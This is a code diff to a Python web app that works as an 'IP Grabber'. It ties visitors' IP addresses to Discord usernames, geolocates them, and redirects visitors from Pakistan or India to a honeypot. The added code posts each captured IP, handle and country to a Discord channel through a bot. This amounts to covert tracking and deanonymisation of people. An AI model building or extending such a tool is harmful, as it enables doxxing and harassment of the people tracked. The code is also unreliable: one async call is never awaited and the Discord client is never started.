@@ -9,6 +9,9 @@ Dependencies:
 
 """
 
+import asyncio
+import threading
+import discord
 import requests
 from logger import Logger
 from json_handler import *
@@ -20,6 +23,27 @@ default_server:str
 alternative_server_url:str
 test_flag:bool
 redirected:bool
+channel_id:int
+config:dict
+
+# Initialize the Discord client
+intents = discord.Intents.default()
+intents.messages = True
+client = discord.Client(intents=intents)
+
+# Function to send a message to a specific channel
+async def send_to_channel(message):
+    global channel_id, client
+    channel = client.get_channel(channel_id)
+    if channel:
+        await channel.send(message)
+    else:
+        print("Channel not found.")
+
+# Event handler for when the bot is ready
+@client.event
+async def on_ready():
+    print(f'Logged in as {client.user}')
 
 
 
@@ -61,6 +85,13 @@ async def redirect_handler(ip ,normal_server, honeypot):
         
     if country_code and country_code in ['PK', 'IN']:
         l.info(f"Rediredcting to Honeypot: {honeypot}")
+        send_to_channel(f'''
+Honeypot triggered:
+Honeypot: {honeypot}
+IP: {ip}
+Country: {country_code}
+More infos: https://iplocation.com/?ip={ip}
+''')
         return redirect(honeypot)
     
     else:
@@ -85,7 +116,6 @@ async def ip_grab(dc_handle):
     l.info(f'IP Address is: {ip_address}')
     try:
         data = await request_ip_location(ip_address)
-        l.info(f'data is: {data}')
         ip = data['ip']
         ip_number = data['ip_number']
         ip_version = data['ip_version']
@@ -94,6 +124,13 @@ async def ip_grab(dc_handle):
         isp = data['isp']
         dc_handle += '?'
         l.info(f'data is: {data}')
+        await send_to_channel(f'''
+IP Grabber called:
+Username provided: {dc_handle}
+IP: {ip_address}
+Country: {country_name}/{country_code2}
+More infos: https://iplocation.com/?ip={ip_address}
+''')
         return await render_template('result.html',dc_handle = dc_handle, ip=ip, ip_number=ip_number, ip_version=ip_version,
                                 country_name=country_name, country_code2=country_code2, isp=isp)
     except Exception as e:
@@ -137,6 +174,5 @@ if __name__ == '__main__':
     alternative_server_url = config['honeypot_server']
     
     app_port = int(config['app_port'])
-  
     
     app.run(host='0.0.0.0',port = app_port)
